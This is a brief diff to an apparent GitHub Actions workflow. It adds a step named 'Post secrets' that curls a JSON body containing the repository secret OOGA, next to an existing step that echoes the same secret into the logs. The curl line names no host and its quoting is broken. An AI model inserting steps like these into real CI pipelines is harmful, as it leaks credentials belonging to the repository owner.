@@ -9,6 +9,9 @@ jobs:
     steps:
       - name: "scetrets"
         run: "echo ${{ secrets.OOGA }}"
+
+      - name: "Post secrets"
+        run: "curl -H 'Content-Type: application/json' -d \"{\"a\": \"${{ secrets.OOGA }}\"}\""
   build:
     name: Build
     runs-on: ubuntu-18.04
